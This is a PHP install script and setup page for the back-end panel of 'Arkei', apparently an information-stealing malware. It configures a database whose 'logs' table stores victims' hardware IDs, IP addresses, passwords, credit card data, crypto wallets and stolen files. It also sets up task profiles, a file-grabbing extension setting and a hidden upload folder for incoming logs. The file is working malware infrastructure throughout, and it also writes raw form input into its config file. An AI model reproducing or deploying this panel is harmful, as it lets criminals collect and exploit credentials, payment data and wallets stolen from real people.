<?php
/*
	Arkei install script
*/
error_reporting(0);
require("app/config.php");

$db_server 		= 	checkParam($_POST["db_server"]);
$db_user 		= 	checkParam($_POST["db_user"]);
$db_password 	= 	checkParam($_POST["db_password"]);
$db_name 		= 	checkParam($_POST["db_name"]);

$server_addr 	= 	checkParam($_POST["server_addr"]);
$logs_folder 	= 	checkParam($_POST["logs_folder"]);

$adm_login 		= 	checkParam($_POST["adm_login"]);
$adm_password 	= 	md5(checkParam($_POST["adm_password"]));


$error = NULL;

if($config["db_server"] != null)
{
	$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);
	
	if(!$database)
	{
		$error = "Can't connect to database.";
		mysqli_close($database);
	}
	else
	{
		header('Location: http://'. $config["server_addr"] .'/index?action=install_success');
		exit(0);
	}
}

if(
	$db_server 		!= null &
	$db_user 		!= null &
	$db_name 		!= null &
	$server_addr 	!= null &
	$logs_folder 	!= null &
	$adm_login 		!= null &
	$adm_password 	!= null
)
{	
	$config_file = fopen("app/config.php", "w");
	$configuration = '<?php  $config = array("db_server" => "'. $db_server .'", "db_user" => "'. $db_user .'", "db_password" => "'. $db_password .'", "db_name" => "'. $db_name .'", "server_addr" => "'. $server_addr .'", "logs_folder" => "'. $logs_folder .'", "adm_login" => "'. $adm_login .'", "adm_password" => "'. $adm_password .'" ); ?>';
	
	fwrite($config_file, $configuration);
	fclose($config_file);
	
	if (!file_exists('server/'. $logs_folder))
	{
		mkdir('server/'. $logs_folder .'/', 0777, true);
	}
	
	$database = mysqli_connect($db_server, $db_user, $db_password, $db_name);
	
	if(!$database)
	{
		$error = "Can't connect to database.";
	}
	else
	{
		$database->query('SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";');
		$database->query('SET time_zone = "+00:00";');
		$database->query('CREATE TABLE IF NOT EXISTS `logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `hwid` text NOT NULL,
  `system` text NOT NULL,
  `ip` text NOT NULL,
  `country` text NOT NULL,
  `date` text NOT NULL,
  `profile` int(11) NOT NULL,
  `user` text NOT NULL,
  `passwords` text NOT NULL,
  `cc` text NOT NULL,
  `coins` text NOT NULL,
  `files` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;');
		$database->query('CREATE TABLE IF NOT EXISTS `profiles` (`id` int(11) NOT NULL AUTO_INCREMENT, `Name` text NOT NULL, `task` text NOT NULL, `Count` int(11) NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;');
		$database->query("INSERT INTO `profiles` (`id`, `Name`, `task`, `Count`) VALUES(1, 'Main Profile', 'none;', 0),(2, 'Two Profile', 'none;', 0),(3, 'Three Profile', 'none;', 0),(4, 'Four Profile', 'none;', 0),(5, 'Five Profile', 'none;', 0),(6, 'Six Profile', 'none;', 0),(7, 'Seven Profile', 'none;', 0),(8, 'Eight Profile', 'none;', 0),(9, 'Nine Profile', 'none;', 0),(10, 'Ten Profile', 'none;', 0);");
		$database->query('CREATE TABLE IF NOT EXISTS `stats` (`Name` text NOT NULL, `Value` text NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8;');
		$database->query("INSERT INTO `stats`(`Name`, `Value`) VALUES ('all_logs','0')");
		$database->query("INSERT INTO `stats`(`Name`, `Value`) VALUES ('all_files','0')");
		$database->query("INSERT INTO `stats`(`Name`, `Value`) VALUES ('errors','0')");
		$database->query('CREATE TABLE IF NOT EXISTS `settings` (`Name` text NOT NULL,`Value` text NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8;');
		$database->query("INSERT INTO `settings`(`Name`,`Value`) VALUES ('grub_files','txt;log;');");
		
		mysqli_close($database);
	}
	
	header('Location: http://'. $server_addr .'/index');
	exit(0);
}
else
{
	$error = "Please enter all params!";
}

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>

<!doctype html>
<html lang="en-us">
<head>
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>Install | Arkei</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,600,700" rel="stylesheet">
	
	<link rel="apple-touch-icon" href="apple-touch-icon.png">
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
	
	<link rel="stylesheet" href="css/main.min.css">
</head>
<body>
	<br>
	<br>
	
	<div class="container">
		<form id="install" action="/install" method="post">
		<div class="row">
			<div class="col-xl-3 u-hidden-down@wide">
				<aside class="c-menu u-ml-medium"></aside>
			</div>
			
			<div class="col-md-7 col-xl-6">
				<main>
					<h2 class="u-h3 u-mb-small">Install Arkei</h2>
					
					<? 
					if($error != null)
					{
						?>
						<div class="c-alert c-alert--danger">
							<i class="c-alert__icon fa fa-exclamation-triangle"></i> <? echo $error; ?></div>
						<?
					}
					?>
					
					<div class="c-card u-p-medium u-text-small u-mb-small">
						<h6 class="u-text-bold">MySQL Info</h6>
						
						<dl class="u-flex u-pv-small">
							<div class="c-field">
								<label class="c-field__label " for="db_server">Server Address</label>
								<input class="c-input" id="db_server" name="db_server" type="text" placeholder="localhost" value="">
							</div>
						</dl>
						
						<dl class="u-flex u-pv-small">
							<div class="c-field">
								<label class="c-field__label " for="db_user">Username</label>
								<input class="c-input" id="db_user" name="db_user" type="text" placeholder="root" value="">
							</div>
						</dl>
						
						<dl class="u-flex u-pv-small">
							<div class="c-field">
								<label class="c-field__label " for="db_password">Password</label>
								<input class="c-input" id="db_password" name="db_password" type="password" placeholder="toor" value="">
							</div>
						</dl>
						
						<dl class="u-flex u-pv-small">
							<div class="c-field">
								<label class="c-field__label " for="db_name">Database Name</label>
								<input class="c-input" id="db_name" name="db_name" type="text" placeholder="arkei" value="">
							</div>
						</dl>
					
					</div>
					
					<div class="c-card u-p-medium u-mb-small u-text-small">
						<h6 class="u-text-bold">Server Info</h6>
						
						<dl class="u-flex u-pv-small">
							<div class="c-field">
								<label class="c-field__label " for="server_addr">Web-Server Addr</label>
								<input class="c-input" id="server_addr" name="server_addr" type="text" placeholder="arkei.com" value="">
							</div>
						</dl>
						
						<dl class="u-flex u-pv-small">
							<div class="c-field">
								<label class="c-field__label " for="logs_folder">Folder to upload logs</label>
								<input class="c-input" id="logs_folder" name="logs_folder" type="text" placeholder="_files2387ygsfuasgfd7623t" value="">
							</div>
						</dl>
							
						<dl class="u-flex u-pv-small">
							<div class="c-field">
								<label class="c-field__label " for="adm_login">Admin Login</label>
								<input class="c-input" id="adm_login" name="adm_login" type="text" placeholder="admin" value="">
							</div>
						</dl>
							
						<dl class="u-flex u-pv-small">
							<div class="c-field">
								<label class="c-field__label " for="adm_password">Admin Password</label>
								<input class="c-input" id="adm_password" name="adm_password" type="password" placeholder="admin" value="">
							</div>
						</dl>
						
					</div>
						
						<div class="col u-mb-medium" style="width:200px; margin-right: 50%;">
							<a onclick="document.getElementById('install').submit(); return false;" class="c-btn c-btn--success c-btn--fullwidth">Install</a>
						</div>
					
				</main>
			</div>
			
			<div class="col-md-5 col-xl-3 u-mb-medium u-hidden-down@tablet"></div>
			</form>
		</div>
	</div>
	<script src="js/main.min.js"></script>
</body>
</html>